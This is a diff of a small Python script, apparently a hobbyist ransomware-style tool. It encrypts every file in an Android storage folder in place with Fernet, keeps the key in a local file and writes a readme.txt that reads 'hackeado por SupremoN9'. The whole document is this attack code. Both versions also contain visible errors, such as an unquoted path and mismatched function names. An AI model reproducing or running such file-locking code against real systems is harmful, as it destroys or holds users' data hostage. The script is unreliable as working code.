@@ -1,43 +1,34 @@
-from cryptography.fernet import Fernet 
-import os 
+from cryptography.fernet import Fernet
+import os
 
-
-def generatekey():
+def generar_key():
     key = Fernet.generate_key()
-    with open("key.key", "wb") as key_file:
+    with open('key.key', 'wb') as key_file:
         key_file.write(key)
 
+def cargar_key():
+    return open('key.key', 'rb').read()
 
-def retornarkey():
-    return open("key.key", "rb").read()
+def encrypt(items, key):
+    f = Fernet(key)
+    for item in items:
+        with open(item, 'rb') as file:
+            file_data = file.read()
+        encrypted_data = f.encrypt(file_data)
+        with open(item, 'wb') as file:
+            file.write(encrypted_data)
 
+if __name__ == '__main__':
 
-def encryp(items, key):
-    i = Fernet(key)
-    for x in items:
-        with open(x, "rb") as file:
-             file_data = file.read()
-        data = i.encrypt(file_data)
+    path_to_encrypt = /storage/emulated/0/RAMprueba
+    items = os.listdir(path_to_encrypt)
+    full_path = [path_to_encrypt+'\\'+item for item in items]
 
-        with open(x, "wb") as file: 
-            file.write(data)
+    generar_key()
+    key = cargar_key()
 
+    encrypt(full_path, key)
 
-if __name__  == "__main__": 
-
-
-    archivos = storage
-    items = os.listdir(archivos)
-    archivos2 =  [archivos+"\\"+x for x in items]
-
-
-
-generarKey()
-key = retornarkey()
-
-encryp(archivos_2, key)
-
-with open(archivos+"\\"+"readme.txt", "wb") as file: 
-     file.write ("SupremoN9")
-     file.write("hackeado por SupremoN9")
-
+    with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file:
+        file.write('hackeado por SupremoN9\n')
+        file.write('hacker for SupremoN9. N9')
